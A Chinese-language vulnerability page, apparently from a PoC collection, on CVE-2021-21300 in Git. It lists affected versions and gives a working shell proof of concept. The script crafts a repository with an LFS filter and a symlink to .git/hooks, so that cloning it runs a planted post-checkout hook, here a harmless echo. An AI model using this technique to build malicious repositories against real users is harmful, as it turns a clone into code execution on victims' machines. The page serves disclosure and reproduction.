# Git for Visual Studio远程执行代码漏洞 CVE-2021-21300

## 漏洞描述

此漏洞影响具有不区分大小写的文件系统的平台，当某些过滤器被使用时（例如Git LFS）。Git可能会被欺骗运行克隆期间的远程代码。

## 漏洞影响

```
v2.17.6
v2.18.5
v2.19.6
v2.20.5
v2.21.4
v2.22.5
v2.23.4
v2.24.4
v2.25.5
v2.26.3
v2.27.1
v2.28.1
v2.29.3
v2.30.2
```

## 漏洞复现

参考阅读: https://www.openwall.com/lists/oss-security/2021/03/09/3

## 漏洞POC

```bash
#!/bin/sh

git init delayed-checkout &&
(
  cd delayed-checkout &&
  echo "A/post-checkout filter=lfs diff=lfs merge=lfs" \
  	>.gitattributes &&
  mkdir A &&
  printf '#!/bin/sh\n\necho PWNED >&2\n' >A/post-checkout &&
  chmod +x A/post-checkout &&
  >A/a &&
  >A/b &&
  git add -A &&
  rm -rf A &&
  ln -s .git/hooks a &&
  git add a &&
  git commit -m initial
) &&
git clone delayed-checkout cloned
```